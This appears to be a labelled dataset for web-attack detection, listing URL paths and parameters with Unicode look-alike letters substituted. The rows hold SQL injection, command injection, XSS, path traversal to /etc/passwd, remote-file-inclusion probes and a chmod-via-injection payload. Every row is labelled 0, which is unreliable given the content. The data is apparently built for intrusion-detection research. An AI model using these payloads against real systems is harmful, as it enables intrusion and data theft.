sentences 	 labels
/ 𝕤𝓽ring / strings / parameters = '  & echo bjunbg $  (  ( 90 + 77 )  )  $  ( echo bjunbg ) bjunbg &  	 0
/ ꜱ𝚝ring / strings / parameters = 1 )  )  as mlpf where 7425 = 7425 ; select sleep ( 5 )  --  	 0
/ 𝚎𝘅amples / jsp / checkbox / index . php ? post =  .  .  / config / password  	 0
/ ѕ𝓽ring / strings / parameters = 1 %  "  "  )  )  or 8156 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  	 0
/ mа𝗶n . php ? logout =  " rm \ xa0q51679818 & rem \ xa0  	 0
/ ℎ𝙚lp . php ? q =  '  \ x0auname  > q56533456  #  	 0
/ 𝖈ℊi-915 / vssetcookie . exe  	 0
/ 𝐞×amples / jsp / jsp2 / el / admin / plog-admin-functions . php ? config [ basedir ]  =  / etc / passwd \ x00  	 0
/  .  /  /  .  /  { file }  	 0
/ ᑲl𐌚sefdm . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝗍o𝒑 . php ? stuff =  "  \ x0dsleep \ x098 \ x09 #  	 0
/ 𝘴𝓉ring / strings / parameters = ;  str =  $  ( echo kkiqnh )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  '  	 0
/ 𝐬𝕥ring / strings / parameters = |   [  7 -ne  $  ( echo tkxzex  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  /  	 0
/ 𝓼𝓉ring / strings / parameters = ;  str =  $  ( echo etahjn )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  	 0
/ 𝕤𝖙ring / strings / parameters = < meta http-equiv = set-cookie content =  " testziyq = 5055 "  >  	 0
/ 𝚎𝘅amples / servlets / servlet / ncbook . cgi ? action = default & current =  | cat  / etc / passwd |  & form_tid = 996604045 & prev = main . html & list_message_index = 10  	 0
/ 𝗌𝚝ring / strings / parameters = 1 '  )  and sleep ( 5 )  and  (  ' xecl '  like  ' xecl  	 0
/ ƽ𝘵ring / strings / parameters = 1 '  |  |  ( select  ' lxyu '  from dual where 5789 = 5789 union all select null #  	 0
/ 𝓈𝐭ring / modo = entrar '  + and +  ' 1 '  =  ' 1 & login = kaidanne & pwd = d67198tad4r6 & remember = on & b1 = entrar  	 0
/ 𝓼𝘁ring / modo = entrar & login = ivanyi0 & pwd = na + rbons "  + and +  " 1 "  =  " 1 & remember = off & b1 = entrar  	 0
/ 𝑠𝓉ring / strings / parameters = & echo $ ifsghaymk $  (  ( 85 + 70 )  )  $  ( echo $ ifsghaymk ) ghaymk &  	 0
/ ƽ𝔱ring / strings / parameters = -1188 )  )  union all select 4711 --  	 0
/ ƽ𝙩ring / strings / parameters = 1 "  "  )  )  as nejd where 2885 = 2885 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  	 0
/  ?  < meta http-equiv = set-cookie content =  " testggad = 2000 "  >  	 0
/ 𝚜𝐭ring / strings / parameters = < link rel =  "  " stylesheet "  "  href =  "  " http :  /  / vulnerability-lab . com / crosssitescripting . css "  "  >  	 0
/ 𝙨𝕥ring / strings / parameters = 1 %  "  "  )  )  )  and sleep ( 5 )  #  	 0
/ 𝘵o𝓅 . php ? stuff =  "  \ x0arm q36232773  #  	 0
/ 𝓈𝔱ring / strings / parameters = '  ;  str =  $  ( echo pupqpk )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  	 0
/ 𝐬𝓽ring / strings / parameters = 1 "  "  ; begin user_lock . sleep ( 5 )  ;  end and  "  " mdje "  "  like  "  " mdje  	 0
/ 𝘴𝙩ring / modo = registro & login = gofron & password = emenda & nombre = ranger & apellidos = jalmar + arambide & emaila = avdjusko . polivitskiui @ javilasan . kr & dni = 43344488e & direccion = c /  + huerta + el + palomar ,  + s / n ,  +  & ciudad = moral + de + la + reina & cp = 26321 & provincia = navarra & ntc = 8906753589581639 & b1 = registrar  	 0
/ 𝒔𝗍ring / strings / parameters = | echo lcijbi $  (  ( 90 + 7 )  )  $  ( echo lcijbi ) lcijbi |  	 0
/ ƽ𝑡ring / strings / parameters = 1 '  and 6414 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  and  ' lwir '  like  ' lwir  	 0
/ 𝐬𝚝ring / modo = registro & login = ala ' n & password = b1jed7ad & nombre = werner & apellidos = santiago + espejel & email = okeefe . gilger0 @ ajuntamentdebarcelona2-0 . in & dni = 87784817g & direccion = carretera + del + carmel + 99 +  & ciudad = ribafrecha & cp = 40331 & provincia = a + corua & ntc = 3867909567368782 & b1 = registrar  	 0
/ 𝑠𝔱ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo cjcsgg )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 0
/ 𝗁𝐞lp . php ? q =  ' rm q38575663  #  	 0
/ 𝓼𝕥ring / strings / parameters = 1 '  in boolean mode )  and 3715 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  #  	 0
/ 𝗌𝗍ring / strings / parameters = '  ;  str =  $  ( echo zepyms )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  	 0
/ ҽ⤬amples / servlets / servlet / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331904404 '  )  <  / script >  	 0
/ 𝓈𝑐ripts / search . scr . php ? globals [ pth ]  [ classes ]  = xxpathxx ?  	 0
/ 𝖘𝒕ring / strings / parameters = 1 '  )  where 8211 = 8211 union all select null , null , null , null , null #  	 0
/ 𝒔𝐜ripts / index . php ? action = login & languages [ nessus ]  = syscp_1211 . nasl & language = nessus & langs [ nessus ]  [ 0 ]  [ file ]  =  / etc / passwd  	 0
/ jɑ𑜆ascript / procurement . exe  	 0
/ 𝘀𝕥ring / strings / parameters = -7107 "  "  )  )  )  order by 1 #  	 0
/ ƽ𝖙ring / modo = entrar & login = cheng & pwd = cazc , alear & remember = off & b1 = entrar  	 0
/ 𝘀𝔱ring / strings / parameters = 1 )  ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  	 0
/ 𝑠𝗍ring / strings / parameters = $  { exec ( print (  ` echo yymyqb ; echo  $  (  ( 54 + 65 )  )  ; echo yymyqb ; echo yymyqb `  )  ;  \  \ yymyqb  	 0
/ 𝓼𝗍ring / modo = insertar & precio = 8460 & b1 = confirmar /  	 0
/ ⅰnᏧex . php ? file_name [  ]  = xxpathxx ?  	 0
/ 𝑐on𝙩enido_4 . 8 . 4 / contenido / cronjobs / run_newsletter_job . php ? cfg [ path ]  [ contenido ]  = xxpathxx ?  	 0
/ 𝙨𝕥ring / strings / parameters = < a href =  "  /  /  ͥ . ws "  > click  	 0
/ 𝒕o𝓅 . php ? stuff =  "  & ver \ x0b > q72181135 & rem \ x0b  	 0
/ j𝚊𝖛ascript / msadm . exe  	 0
/ 𝚎n-ꭎs / hipkz026 . fts ?  < meta http-equiv = set-cookie content =  " testyrbs = 2855 "  >  	 0
/ 𐑈𝕥ring / strings / parameters = '  |   [  7 -ne  $  ( echo iqybmk  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 0
/ 𐑈𝓉ring / strings / parameters = < body / onactivate = alert ( 1 )  >  	 0
/ 𝓼𝙩ring / strings / parameters = 1 '  |  |  ( select  ' xhcr '  from dual where 9279 = 9279 ; iif ( 2452 = 8999 , 1 , 1 / 0 )  	 0
/ 𝔰𝕥ring / strings / parameters = -9574 '  )  as rxym where 4719 = 4719 union all select 4719 , 4719 , 4719 , 4719 , 4719 , 4719 , 4719 --  	 0
/ 𝒔𝓽ring / strings / parameters = 1 '  )  ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  	 0
/ 𝙚𝐱amples / jsp / error / jgs_portal_statistik . php ? meinaction = themen & month = 1 & year = 1 '  	 0
/ 𝚜𝓽ring / strings / parameters = -5165 '  )  )  or 1570 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  ' zpnv '  like  ' zpnv  	 0
/ j𝙖𝓋ascript / vfs . exe  	 0
/ 𝔯℮cordings / forum_2 . php ? msg = 10 & return =  < script > foo <  / script >  	 0
/ 𐑈𝘁ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo vgafpt )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  "  	 0
/ 𝓼𝖙ring / strings / parameters = < a href =  "  " http :  /  / www . google . com "  "  > crosssitescripting <  / a >  	 0
/ 𝘀𝘵ring / strings / parameters = < meta http-equiv = set-cookie content =  " testulex = 4996 "  >  	 0
/ 𝔰𝓽ring / strings / parameters = $  { exec ( print (  ` echo twzntz \ necho  $  (  ( 85 + 67 )  )  \ necho twzntz \ necho twzntz `  )  ;  # twzntz  	 0
/ 𝘀𝗍ring / strings / parameters = '  |   [  5 -ne  $  ( echo jvvwqm  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  	 0
/ 𝙨𝓽ring / strings / parameters = 1 %  "  "  )  )  )  or  ( select 9173 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9173 = 9173 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  and  (  (  (  "  "  %  "  "  =  "  "  	 0
/ ɑ𝒅min . php ?  "  >  < script > alert ( 409956083318 )  <  / script >  <  "  	 0
/ ẝ𐐽gi-bin / gw5 / gwweb . exe ? help = bad-request  	 0
/ j𝔞𝔳ascript /  . passwd . mdb  	 0
/ ƽ𝚝ring / strings / parameters = "  & echo ccwsns $  (  ( 52 + 72 )  )  $  ( echo ccwsns ) ccwsns |  	 0
/ 𐑈𝕥ring / modo = registro & logina = rokas & password = telarejo & nombre = sin & apellidos = eraso + rebes & email = lapotaire @ psicoencuentronline . cc & dni = 32760470y & direccion = c /  + los + arces ,  + 155 ,  +  & ciudad = castejn + del + puente & cp = 40314 & provincia = girona & ntc = 8177793043919155 & b1 = registrar  	 0
/ 𝑠𝖙ring / strings / parameters = 1 '  )  and 3715 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  ' svhx '  =  ' svhx  	 0
/ ꜱ𝚝ring / strings / parameters = < style > p [ foo = bar {  }  *  { -o-link :  ' javascript : confirm ( 1 )  '  }  {  }  *  { -o-link-source : current }  *  { background : red }  ]  { background : green }  ;  <  / style >  	 0
/ z𝚊𝖻bix / frontends / php / locales . php ? download = 1 & langto = 1 & extlang [  "  . system (  ' chmod + 777 +  / tmp / tyrovghehq . sh '  )  .  "  ]  = 1  	 0
/ 𝕤𝓉ring / strings / parameters = <  !  [ cdata [  < script > var n = 0 ; while ( true )  { n +  +  ;  }  <  / script >  ]  ]  >  	 0
/ 𝚜𝕥ring / strings / parameters = 1 )  )  )  ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 --  	 0
/ m𝕒𝗶n . php ? logout =  "  & sleep \ x099 \ x09 #  	 0
/ 𐑈𝙩ring / strings / parameters = |   [  5 -ne  $  ( echo pdveeq  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  	 0
/ ⅇn𝖈 / content . php ? home_path = xxpathxx ?  	 0
/ 𝓼𝗍ring / strings / parameters = "  )  )  )  )  and 0 = benchmark ( 3000000 , md5 ( 1 )  )   /  *  	 0
/ 𝘁Ɜaf3tdz . jsp ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝓼𝓉ring / strings / parameters = |   [  7 -ne  $  ( echo hzzokr  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 0
/ 𝒔𝐭ring / id = 2 /  & nombre = queso + manchego & precio = 85 & cantidad = 15 & b1 = aadir + al + carrito  	 0
/ 𐑈𝘁ring / modo = registro & login = lowe & password = 26ti8er2st5ltic9 & nombre = nathaniel & apellidos = ledesma + palls & email = durning_assaf @ nutrimama . ie & dni = 77753227w & direccion = calle + h * elsinki ,  *  + 78 ,  +  & ciudad = calafell & cp = 33800 & provincia = cantabria & ntc = 5488808087081564 & b1 = registrar  	 0
/ 𝓼𝓉ring / modo = registro & login = helem & password = aparecer & nombre = pancho & apellidos = goldaratz + brizuela & email = lahbib_hodo @ silver-knights . ie & dni = 54489862x & direccion = berlin + 116 +  & ciudad = sudanell & cp = 24346 & provincia = burgos & ntc = 011349048658532 & b1 = registrar  	 0
/ 𝘀𝘵ring / strings / parameters = >  "  "  < meta http-equiv =  "  " set-cookie "  "  content =  "  " userid =  < script > document . cookie = true <  / script >  "  "  >  	 0
/ ⅇ𝗑amples / jsp / cal / cvslog . cgi ? file =  < script > window . alert <  / script >  	 0
/ 𝚜𝙩ring / modo = registro & login = bagnato33 & password = prescindible & nombre = hiram '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & apellidos = penagos + pijoan & email = fenell @ salsaspain . fr & dni = 11130412e & direccion = c /  + leon + pinelo ,  + 5 + 3e & ciudad = cordovilla & cp = 10320 & provincia = navarra & ntc = 2582130639764727 & b1 = registrar  	 0
/ 𝕤𝓉ring / modo = registro & login = colline & password = h30i2o & nombre = sylvina & apellidos = mateu + bernaus & email = paros "  style =  " background : url ( javascript : alert (  ' paros '  )  )  & dni = 75667654t & direccion = c /  + del + torrent + de + l ' olla ,  + 111 + 11 ? d & ciudad = fuerte + del + rey & cp = 49610 & provincia = guadalajara & ntc = 5880986678228634 & b1 = registrar  	 0
/ 𝓼𝙩ring / strings / parameters = 1 '  )  as zdhq where 5586 = 5586 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  	 0
/ ℹn𝖙erface / login / login_frame . php ? site =  < script > alert ( owasp zap )  ;  <  / script >  '  ; waitfor delay  ' 0 : 0 : 15 '  ;  --  	 0
/ 𝖾⤬amples / servlets / servlet / htgrep / file = index . html & hdr =  / etc / passwd  	 0
/ 𑣁𝘁ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo hsdbta )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 0
/ 𝘀𝖙ring / id = 3 & nombre = jamn + ibrico & precio = 39 /  & cantidad = 64 & b1 = aadir + al + carrito  	 0
/ 𝘣𝔢market / postscript / postscript . php ? p_mode = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ?  	 0
/ 𝘴𝓽ring / strings / parameters = 1 '  )  and make_set ( 4551 = 6487 , 6487 )  and  (  ' jnqa '  =  ' jnqa  	 0
/ 𝒔𝙩ring / strings / parameters = 1 )  and 5556 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  ( 5098 = 5098  	 0
/ 𝔟ook𝓼 / home . php ? home = xxpathxx  	 0
/ 𝑝𝒽pmyadmin / modules . php ? mod = fm & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & bn = fm_d1  	 0
/ 𝓈𝗍ring / strings / parameters = 1 '  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  	 0
/ ѕ𝕥ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo lvmwxb )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 0
/ ℯn-𝕦s / n9xlumt5 . mscgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𑣁𝕥ring / strings / parameters = "  )  ; waitfor delay  ' 0 : 0 : __time__ '  --  	 0
/ 𝘴𝖙ring / strings / parameters = "  . print (  ` echo dshoev echo  $  (  ( 44 + 47 )  )  echo dshoev echo dshoev `  )  ;  # dshoev  	 0
/ 𝚜𝘁ring / id = 3 & nombre = ques + o + manchego & precio = 39 & cantidad = 65 & b1 = aadir + al + carrito  	 0
/ 𝓈𝙩ring / strings / parameters = | echo $ ifsladzja $  (  ( 28 + 57 )  )  $  ( echo $ ifsladzja ) ladzja &  	 0
/ 𐑈𝑡ring / strings / parameters = echo $ ifsjcteqy $  (  ( 49 + 31 )  )  $  ( echo $ ifsjcteqy ) jcteqy "  	 0
/ mᒿꞙpztty . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ ѕ𝕥ring / strings / parameters = 1 where 5925 = 5925 and 8189 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  	 0
/ 𝗲m𝒷ed / day . php ? path =  / etc / passwd \ x00  	 0
/ 𝖘𝔱ring / strings / parameters = &  & echo mkgyyl $  (  ( 46 + 31 )  )  $  ( echo mkgyyl ) mkgyyl \  \  	 0
/ 𝖘𝓽ring / strings / parameters = "  & echo $ ifstquhgt $  (  ( 51 + 9 )  )  $  ( echo $ ifstquhgt ) tquhgt |  	 0
/ 𝗍o𝙥 . php ? stuff =  "  \ x0asleep \ x0911 \ x09 #  	 0
/ 𝒗𝖜mg565s . htm ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝐬𝕥ring / strings / parameters = echo ybhkvy $  (  ( 91 + 88 )  )  $  ( echo ybhkvy ) ybhkvy &  	 0
/ 𝒽ℯlp . php ? q =  "  | ping ; -w ; 11000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ;  	 0
/ 𝐞n-ꭎs / ddoworrl . aspx ?  < script > document . cookie =  " testvlau = 8517 ;  "  <  / script >  	 0
/ 𝓉o𝓹 . php ? stuff =  ' uname \ x09 > q19246858 \ x09 #  	 0
/ o𝗱zk𝟸9aa . exe ?  < meta http-equiv = set-cookie content =  " testtfvh = 2141 "  >  	 0
/ 𝓫𝚊se_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1332008327 '  )  <  / script >  	 0
/ 𝚜𝖙ring / strings / parameters = |  | echo ffbsef $  (  ( 15 + 13 )  )  $  ( echo ffbsef ) ffbsef |  	 0
/ 𝙨𝙩ring / strings / parameters = < meta http-equiv = set-cookie content =  " testftxz = 5980 "  >  	 0
/ 𝖾𝒙amples / jsp / num / pals-cgi ? palsaction = restart & documentname =  / etc / passwd  	 0
/ 𝓼𝑡ring / strings / parameters = -4586 '  )  as shdb where 6176 = 6176 union all select 6176 , 6176 , 6176 , 6176 #  	 0
/ 𝕤𝙩ring / id = 1 & nombre = queso + manchego +  & precio = 85 & cantidad = 61 & b1 = aadir + al + carrito  	 0
/ 𝐬𝒕ring / strings / parameters = <  !  	 0
/ 𝚜𝕥ring / modo = registro & logina = craig-du & password = 8rre0dad7ra & nombre = octavia & apellidos = yaben + billini & email = formichi @ nevadahispanica . pt & dni = 09082221g & direccion = avinguda + gatassa + s / n + 5a & ciudad = olmedillo + de + roa & cp = 39255 & provincia = ourense & ntc = 9946991800186707 & b1 = registrar  	 0
/ հ𝖾lp . php ? q =  " rm ; q77231587 & rem ;  	 0
/ 𝑤𝘦bcgi / view_item ? html_file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ 𝑠𝒄ripts / unlg1 . 1  	 0
/ 𝑠𝓽ring / strings / parameters = 1 %  '  )  )  )  ; select benchmark ( 5000000 , md5 ( 0x714e4153 )  )  #  	 0
/ 𝙚𝗑amples / jsp / num / index . php ? page =  / etc / passwd \ x00  	 0
/ 𝓈ꭚsuser / docmgr / sendmail . stm ? name =  < script > alert ( document . cookie )  <  / script >  	 0
/ 𝗵𝐞lp . php ? q =  "  & del q26584324 & rem  	 0
/ jn𝙫🯸90lt . fts ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝙥𝙨ynch / nph-psf . exe ? css = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  	 0
/ 𑣁𝒸ripts / index . php ? act = sm_window & page = event & day = -1 union select 1 , 1331908735 , 712064188  --  	 0
/ 𝙚𝕩amples / jsp / jsp2 / el / index . php ? x = browse & category =  ' union select  ' 1 '  ,  ' 2 '  ,  ' pixelpost_category_sql_injection . nasl '  ,  ' 1331904457 '  ,  ' 5 '  --  	 0
/ j𝑎𝕧ascript / bb . exe  	 0
/ 𝕤𝕥ring / strings / parameters = -8069 '  )  )  or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  (  ' qbvz '  =  ' qbvz  	 0
/ 𐑈𝖙ring / strings / parameters = 1 "  "  )  and make_set ( 8403 = 8403 , 8899 )  and  (  "  " akha "  "  like  "  " akha  	 0
/ 𝟎zƼ75z74 . asp ?  < script > document . cookie =  " testuhsv = 9753 ;  "  <  / script >  	 0
/ 𝖘𝑡ring / strings / parameters = 1 '  in boolean mode )  or 7552 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  #  	 0
/ 𝑠𝕥ring / strings / parameters = '  | echo mxshqc $  (  ( 54 + 42 )  )  $  ( echo mxshqc ) mxshqc  	 0
/ 𝕤𝚝ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo nwayiz )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 0
/ 𝑠𝐭ring / strings / parameters = 1 '  )  )  ; waitfor delay  ' 0 : 0 : 5 '  and  (  (  ' uvlf '  =  ' uvlf  	 0
/ 𝗌𝙩ring / strings / parameters = <  ?  echo (  '  < scr )  '  ; echo (  ' ipt > alert (  "  " xss "  "  )  <  / script >  '  )  ;   ?  >  	 0
/ 𝓹𝗁pmyadmin /  ? user = jffnms_user_sql_injection . nasl '  union select 2 ,  ' admin '  ,  '  $ 1 $ rxs1rotx $ iza1s3fccfyvfa9rwkbmi .  '  ,  ' administrator '  --  & file = index & pass =  	 0
